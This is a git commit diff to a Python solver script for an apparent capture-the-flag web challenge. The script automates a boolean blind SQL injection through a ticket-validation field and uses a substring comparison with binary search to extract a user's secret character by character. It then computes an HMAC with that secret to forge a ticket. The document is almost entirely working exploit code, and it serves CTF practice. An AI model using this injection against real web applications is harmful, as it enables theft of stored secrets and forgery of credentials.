58b7a5544f4ac3969024b4640b87a02209d41d5a
Tomasz Kępa <tomek@qed.ai>
2017-04-22 14:45:18 +0200

    Task #1: Normal flag

--- 01_web/task_01.py
+++ 01_web/task_01.py
@@ -2,16 +2,21 @@ import hashlib
 import hmac
 import io
 import qrcode
+import random
 import re
 import requests
+import string
 from PIL import Image
 
 
 CODE_DIM = (400, 400)
 OFFSET = (350, 50)
 TICKET_PATH = 'free_ticket.png'
+
 LOGIN_URL = 'https://easy.web.uw2017.p4.team/login'
+REGISTER_URL = 'https://easy.web.uw2017.p4.team/register'
 VALIDATE_URL = 'https://easy.web.uw2017.p4.team/validate'
+
 QUERY_OK = 'i znajduje się w naszej bazie danych'
 QUERY_WRONG = 'i nie znajduje się w naszej bazie danych'
 TICKET_OK = 'Twój bilet jest poprawny'
@@ -47,11 +52,27 @@ def hmac_ticket(user_secret, ticket_type):
     return hmac.new(user_secret.encode('utf-8'), ticket_type.encode('utf-8'), hashlib.sha256).hexdigest()
 
 
+def get_random_string(n):
+    ALPHABET = list(string.ascii_letters + string.digits)
+
+    return ''.join(random.choice(ALPHABET) for _ in range(n))
+
+
 class EasyWeb():
     sess = None
     reg = re.compile("<div class=\"alert alert-info\">([\w\W]*?)</div>")
     uname_hash = None
-    user_secret = None
+
+    def register(self, username, password):
+        user_data = {
+            'username': username,
+            'password': password,
+            'repeat_password': password,
+        }
+
+        self.sess = requests.session()
+        response = self.sess.post(REGISTER_URL, data=user_data)
+
 
     def login(self, username, password):
         login_data = {
@@ -60,7 +81,6 @@ class EasyWeb():
         }
 
         self.uname_hash = hashlib.sha256(username.encode('utf-8')).hexdigest()
-        self.sess = requests.session()
         response = self.sess.post(LOGIN_URL, data=login_data)
 
 
@@ -84,19 +104,29 @@ class EasyWeb():
             else:
                 print(response.text)
 
-
         return QUERY_OK in response.text
 
 
     def try_nth_char(self, n, ch):
-        return self.check_ticket('a" or substring((SELECT user_secret FROM {} limit 1), {}, 1) = "{}"#'
+        return self.check_ticket('a" or substring((SELECT user_secret FROM {} limit 1), {}, 1) <= "{}"#'
             .format(self.uname_hash, n, ch))
 
 
     def find_nth_char(self, n):
-        for c in '01234567890abcdef':
-            if self.try_nth_char(n, c):
-                return c
+        ALPHABET = '0123456789abcdef'
+
+        def bin_search(b, e):
+            if b == e:
+                return b
+            else:
+                m = (b + e) // 2
+                if self.try_nth_char(n, ALPHABET[m]):
+                    return bin_search(b, m)
+                else:
+                    return bin_search(m+1, e)
+
+        i = bin_search(0, len(ALPHABET) - 1)
+        return ALPHABET[i]
 
 
     def find_user_secret(self):
@@ -106,13 +136,18 @@ class EasyWeb():
             user_secret += c
             print(user_secret)
 
-        self.user_secret = user_secret
         return user_secret
 
 
 if __name__ == '__main__':
     ew = EasyWeb()
-    ew.login('bob', '1234')
+    username = get_random_string(10)
+    password = get_random_string(10)
+
+    print(username, password)
+
+    ew.register(username, password)
+    ew.login(username, password)
 
     user_secret = ew.find_user_secret()
 
